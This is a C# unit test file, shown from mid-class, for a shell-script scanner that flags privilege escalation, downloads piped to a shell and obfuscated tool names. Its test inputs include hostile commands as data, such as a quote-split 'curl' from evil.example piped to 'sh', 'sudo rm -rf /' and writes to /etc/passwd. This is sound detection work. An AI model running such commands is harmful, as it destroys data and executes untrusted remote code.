    public void Escaped_redirect_operator_is_not_flagged()
    {
        var findings = Scan("echo \\> /etc/passwd");

        Assert.DoesNotContain(findings, f => f.RuleId == "write-outside-build-root");
    }

    [Fact]
    public void Escaped_match_inside_quotes_does_not_flag_risky_tool()
    {
        // The unescaped $( in the normalized text opens a command substitution that unmasks
        // 'docker' - but the original line keeps it inert inside double quotes (the backslash
        // prevents execution), so the tool is display text, not an invocation.
        var findings = Scan("echo \"remove all: docker rmi \\$(docker images -q)\"");

        Assert.False(findings.Any(f => f.RuleId == "risky-tool"),
            $"Unexpected risky-tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Escaped_match_inside_quotes_does_not_flag_privilege_escalation()
    {
        var findings = Scan("echo \"then run: \\$(sudo whoami)\"");

        Assert.False(findings.Any(f => f.RuleId == "privilege-escalation"),
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Obfuscated_tool_inside_command_substitution_still_escalates()
    {
        // $(...) executes even though the surrounding quotes split the tool name: genuine
        // obfuscation of an invocation, not display text.
        var finding = SingleFinding("echo \"$(c''url http://evil.example/x)\"", "risky-tool");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Escaped_substitution_inside_quotes_does_not_escalate_command_substitution()
    {
        // $( only appears after normalization dropped the backslash, inside double quotes.
        var finding = SingleFinding("echo \"$\\(date\\)\"", "command-substitution");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
    }

    [Fact]
    public void Obfuscation_outside_quotes_still_escalates()
    {
        // The de-obfuscated tool maps back to unquoted positions: genuine hidden intent.
        var finding = SingleFinding("echo \"x\"; s''u''d''o rm -rf /", "privilege-escalation");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Intra_word_quote_split_download_is_detected_and_escalated()
    {
        // c'u'rl is curl after shell quote removal: intra-word quotes are stripped during
        // normalization, the raw line does not match, and the finding escalates.
        var finding = SingleFinding("c'u'rl https://evil.example/x.sh | sh", "network-to-shell");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Intra_word_quote_split_privilege_escalation_is_detected_and_escalated()
    {
        var finding = SingleFinding("s\"u\"do rm -rf /", "privilege-escalation");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Fact]
    public void Edge_quoted_tool_names_remain_exempt_after_intra_word_change()
    {
        // 'npm' and "curl" are quoted strings, not invocations: edge quotes are kept by
        // normalization, so the quoted mask still hides the tool names.
        var findings = Scan("echo 'npm' \"curl\"");

        Assert.False(findings.Any(f => f.RuleId == "risky-tool"),
            $"Unexpected risky-tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Edge_quoted_privilege_tool_mention_remains_exempt_after_intra_word_change()
    {
        var findings = Scan("msg2 \"run 'sudo' to continue\"");

        Assert.False(findings.Any(f => f.RuleId == "privilege-escalation"),
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Command_substitution_inside_quoted_heredoc_body_is_suppressed()
    {
        var findings = Scan("cat <<'EOF'\ndest=\"$LOCAL/$(basename \"$f\")\"\nEOF\n");

        Assert.Empty(findings);
    }

    [Theory]
    // double-quoted delimiter
    [InlineData("cat <<\"EOF\"\n$(x)\nEOF\n")]
    // backslash-escaped delimiter
    [InlineData("cat <<\\EOF\n$(x)\nEOF\n")]
    public void All_quoted_delimiter_forms_suppress_the_body(string content)
    {
        var findings = Scan(content);
        Assert.DoesNotContain(findings, f => f.RuleId == "command-substitution");
    }

    [Fact]
    public void Command_substitution_inside_unquoted_heredoc_body_is_flagged()
    {
        // An unquoted delimiter expands the body: $(...) really runs.
        AssertHasFinding("cat <<EOF\ndest=$(basename x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Tab_stripping_heredoc_terminates_on_indented_delimiter()
    {
        var findings = Scan("cat <<-'EOF'\n\t$(x)\n\tEOF\nsudo whoami\n");

        Assert.False(findings.Any(f => f.RuleId == "command-substitution"),
            "body is suppressed");
        Assert.True(findings.Any(f => f.RuleId == "privilege-escalation"),
            "scanning resumes after the delimiter");
    }

    [Fact]
    public void Non_tab_indentation_does_not_terminate_tab_stripping_heredoc()
    {
        // <<- strips tabs only; a space-indented delimiter is still body content.
        var findings = Scan("cat <<-'EOF'\n $(x)\n EOF\n$(y)\nEOF\n");

        var substitutions = findings.Where(f => f.RuleId == "command-substitution").ToList();
        Assert.Empty(substitutions);
    }

    [Fact]
    public void Quoted_heredoc_piped_to_shell_keeps_body_live()
    {
        AssertHasFinding("cat <<'EOF' | sh\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Quoted_heredoc_piped_to_interpreter_keeps_body_live()
    {
        AssertHasFinding("cat <<'EOF' | python3\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Unterminated_quoted_heredoc_suppresses_to_end_of_content()
    {
        var findings = Scan("cat <<'EOF'\n$(x)\n${!y}");

        Assert.Empty(findings);
    }

    [Fact]
    public void Heredoc_body_still_flags_blocking_rules()
    {
        // F2 only suppresses the non-blocking expansion rules.
        AssertHasFinding("cat <<'EOF'\ncurl http://x | sh\nEOF\n", "network-to-shell", FindingSeverity.Critical);
    }

    [Fact]
    public void Variable_indirection_inside_quoted_heredoc_body_is_suppressed()
    {
        var findings = Scan("cat <<'EOF'\ncmd=${!name}\nEOF\n");

        Assert.DoesNotContain(findings, f => f.RuleId == "variable-indirection");
    }

    [Fact]
    public void Scan_resumes_normally_after_heredoc_terminator()
    {
        var findings = Scan("cat <<'EOF'\nplain body text\nEOF\nsudo whoami\n");

        var sudo = findings.Where(f => f.RuleId == "privilege-escalation").ToList();
        Assert.Single(sudo);
    }

    [Fact]
    public void Herestring_is_not_treated_as_heredoc()
    {
        var findings = Scan("read -r x <<< $(y)");

        AssertHasFinding("read -r x <<< $(y)", "command-substitution", FindingSeverity.Medium);
        Assert.Equal(1, findings.Count(f => f.RuleId == "command-substitution"));
    }

    [Fact]
    public void Shift_and_arithmetic_are_not_heredocs()
    {
        var findings = Scan("x=$((1 << 5))\nshift 2\n");

        // The << inside $(( )) is arithmetic; the command substitution itself is flagged once.
        Assert.Equal(1, findings.Count(f => f.RuleId == "command-substitution"));
    }

    [Fact]
    public void Quoted_double_less_than_is_not_a_heredoc()
    {
        AssertHasFinding("echo \"<<EOF\"\n$(x)\n", "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Consecutive_heredocs_are_consumed_in_order()
    {
        var findings = Scan("diff <<'A' <<'B'\n$(x)\nA\n$(y)\nB\nsudo whoami\n");

        Assert.False(findings.Any(f => f.RuleId == "command-substitution"),
            "both bodies are literal");
        Assert.True(findings.Any(f => f.RuleId == "privilege-escalation"),
            "scanning resumes after both");
    }

    [Fact]
    public void Heredoc_body_lines_keep_hash_as_literal_data()
    {
        // No comment stripping inside bodies: the $( after # is still body content and is
        // suppressed by the quoted delimiter, while an unquoted body would flag it.
        var suppressed = Scan("cat <<'EOF'\n# $(x)\nEOF\n");
        var flagged = Scan("cat <<EOF\n# $(x)\nEOF\n");

        Assert.DoesNotContain(suppressed, f => f.RuleId == "command-substitution");
        Assert.Contains(flagged, f => f.RuleId == "command-substitution");
    }

    [Theory]
    // quoted body
    [InlineData("cat <<'EOF'\n# run: sudo systemctl restart foo\nEOF\n")]
    // unquoted body
    [InlineData("cat <<EOF\n# run: sudo systemctl restart foo\nEOF\n")]
    // tab-indented comment in tab-stripping body
    [InlineData("cat <<-'EOF'\n\t# run: sudo systemctl restart foo\nEOF\n")]
    public void Privilege_escalation_on_heredoc_comment_lines_is_suppressed(string content)
    {
        // A '#' line is a shell comment in a live body and help text in a data body -
        // nothing on it ever runs as a command.
        var findings = Scan(content);
        Assert.False(findings.Any(f => f.RuleId == "privilege-escalation"),
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Write_outside_build_root_on_heredoc_comment_lines_is_suppressed()
    {
        var findings = Scan("cat <<'EOF'\n#   $ echo x | sudo tee /etc/foo\nEOF\n");

        Assert.DoesNotContain(findings, f => f.RuleId == "write-outside-build-root");
        Assert.DoesNotContain(findings, f => f.RuleId == "privilege-escalation");
    }

    [Theory]
    [InlineData("cat <<'EOF'\nsudo rm -rf /\nEOF\n", "privilege-escalation")]
    [InlineData("cat <<'EOF'\necho x > /etc/passwd\nEOF\n", "write-outside-build-root")]
    public void Non_comment_heredoc_body_lines_are_still_flagged(string content, string ruleId)
    {
        // A heredoc body can be piped to an interpreter or written into an installed
        // script, so live-looking lines in it keep their findings.
        AssertHasFinding(content, ruleId, FindingSeverity.High);
    }
}